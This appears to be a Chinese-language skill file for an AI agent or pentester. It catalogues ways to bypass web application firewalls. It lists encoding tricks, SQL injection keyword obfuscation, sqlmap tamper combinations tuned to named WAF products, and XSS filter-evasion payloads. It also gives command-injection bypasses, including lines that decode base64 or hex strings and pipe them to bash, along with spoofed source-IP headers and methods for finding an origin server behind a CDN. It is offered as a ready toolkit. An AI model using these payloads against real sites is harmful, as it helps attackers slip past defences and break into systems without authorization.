---
name: waf-bypass
description: WAF/IDS/IPS绕过技术合集，覆盖编码绕过→分块传输→HPP→协议走私→SQL注入WAF绕过→XSS WAF绕过→RCE WAF绕过→通用技巧全流程
---

# WAF/IDS绕过技术合集

## 1. 通用绕过技术

### 1.1 编码绕过

| 技术 | 示例 | 适用场景 |
|------|------|----------|
| URL双重编码 | `%2527` → `%27` → `'` | 云WAF未递归解码 |
| Unicode | `U+FF07` (全角单引号) | 后端自动规范化 |
| 十六进制 | `0x73656c656374` → `select` | 数据库 |
| Base64 | `eval(atob('...'))` | XSS/JS |
| HTML实体 | `&lt;script&gt;` | XSS特殊位置 |
| 八进制 | `\143\141\164` → `cat` | 命令注入 |

### 1.2 HTTP参数污染 (HPP)

```
GET /search.php?id=1&id=2 UNION SELECT 1,2,3
# ASP/IIS: 拼接两个值 "1,2 UNION SELECT"
# PHP: 取最后一个值 "2 UNION SELECT"
# JSP: 取第一个值 "1"

# 分块传输 (Chunked Transfer)
# Transfer-Encoding: chunked + 小块发送

# HTTP请求走私
# CL.TE / TE.CL → 走私恶意请求到后端
```

## 2. SQL注入WAF绕过

### 2.1 关键字混淆

```sql
# 大小写
SELECT → SeLeCt / Select

# 内联注释 (MySQL)
SELECT → /*!50000SELECT*/
UNION  → /*!50000UNION*/

# 双写
UNION → UNIUNIONON

# 等价替换
AND → &&
OR  → ||
=   → LIKE / REGEXP / BETWEEN
空格 → /**/ / %09 / %0a / %0d / +
```

### 2.2 函数等价

| 原始 | 绕过 |
|------|------|
| `SUBSTRING(str,1,1)` | `MID(str,1,1)` / `LEFT(str,1)` |
| `ASCII('a')` | `ORD('a')` |
| `SLEEP(5)` | `BENCHMARK(10000000,MD5(1))` |
| `information_schema` | `mysql.innodb_table_stats` / `sys.schema_table_statistics` |
| `@@version` | `VERSION()` |
| `LIMIT 0,1` | `LIMIT 1 OFFSET 0` |

### 2.3 SQLMap Tamper

```bash
# 常用tamper组合
sqlmap -u URL --tamper=space2comment,randomcase,charencode --batch

# 针对不同WAF:
# CloudFlare: space2comment,randomcase,between
# ModSecurity: space2comment,charencode
# 安全狗: space2comment,randomcase
# 360: space2comment,charencode,charunicodeencode
```

## 3. XSS WAF绕过

```html
<!-- 大小写 --> <ScRiPt>alert(1)</sCrIpT>
<!-- 双写 -->   <scr<script>ipt>alert(1)</script>
<!-- 标签替换 --> <img src=x onerror=alert(1)>
<!-- 事件处理器 --> <marquee onstart=alert(1)>
<!-- data: URI --> <object data="data:text/html,<script>alert(1)</script>">
<!-- 无括号 --> <script>throw onerror=eval,0,';alert\x281\x29'</script>
```

## 4. 命令注入WAF绕过

```bash
# 空格过滤
;{cat,/flag}                    # {} 包裹
;cat$IFS/flag                   # IFS
;cat</flag                      # 重定向输入

# 分隔符过滤
%0a                             # 换行
%0d%0a                          # CRLF
`id`                            # 命令替换
$(id)                           # 命令替换

# 关键词过滤 (cat替代)
tac / more / less / head / tail / nl / od / xxd / strings / rev

# 编码
echo '636174202f666c6167' | xxd -r -p | bash    # hex
echo 'Y2F0IC9mbGFn' | base64 -d | bash           # base64
$'\143\141\164' /flag                             # octal
```

## 5. IP/地域绕过

```
# 白名单IP绕过 (伪造Header):
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1

# 切换User-Agent:
# Googlebot / Bingbot / 移动端UA

# HTTP方法切换:
GET → POST / PUT / PATCH / OPTIONS
```

## 6. CDN绕过

```bash
# 1. 查找真实IP
# DNS历史: SecurityTrails / Censys
# SSL证书: crt.sh → 搜索域名
# 子域名: 有些子域名不经过CDN
# 邮件头: 邮件服务器通常直连

# 2. CloudFlare绕过
# 已知漏洞端口 (8080/8443/8880/2052/2082/2086/2095)
```

## 7. 综合策略

```
被WAF拦截
├─ 编码: URL编码 → 双重编码 → Unicode → Base64
├─ HTTP: HPP → 分块传输 → HTTP走私 → 方法切换
├─ 关键字: 大小写 → 双写 → 内联注释 → 等价替换
├─ 源头: 伪造IP → 切换UA → CDN绕过找真实IP
└─ 工具: SQLMap tamper → 自定义脚本 → 手工测试
```

---

*参考: OWASP WAF Bypass + PayloadAllTheThings + SQLMap Tamper*
